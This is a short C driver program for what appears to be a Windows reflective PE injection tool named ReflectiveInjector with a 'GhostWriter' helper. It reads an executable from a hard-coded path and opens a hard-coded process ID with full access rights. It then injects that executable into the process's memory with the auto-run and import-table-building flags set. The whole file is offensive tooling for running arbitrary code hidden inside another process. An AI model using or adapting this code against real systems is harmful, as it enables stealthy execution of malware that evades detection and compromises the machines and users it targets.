
#include "ReflectiveInjector.h"


void ReadPE(PE* pe, char* Filename)
{
	HANDLE hFile = CreateFileA(Filename, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);

	pe->Size = GetFileSize(hFile, NULL);

	pe->File = malloc(pe->Size);
	DWORD BytesRead;
	ReadFile(hFile, pe->File, pe->Size, &BytesRead, NULL);

	CloseHandle(hFile);

	InitPE(pe, pe->File, pe->Size);
}

#define ALOT 100000000
#define TARGET_PID 1528
#define PAYLOAD "C:\\filez\\target.exe"


int main()
{
	GHOSTWRITER ghostWriter;
	InitGhostWriter(&ghostWriter);

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TARGET_PID);

	PE pe;
	ReadPE(&pe, PAYLOAD);

	ReflectiveInject(hProc, INVALID_HANDLE_VALUE, &pe, INJECTOR_AUTO_RUN | INJECTOR_BUILD_IAT, &ghostWriter);

	return 0;
}
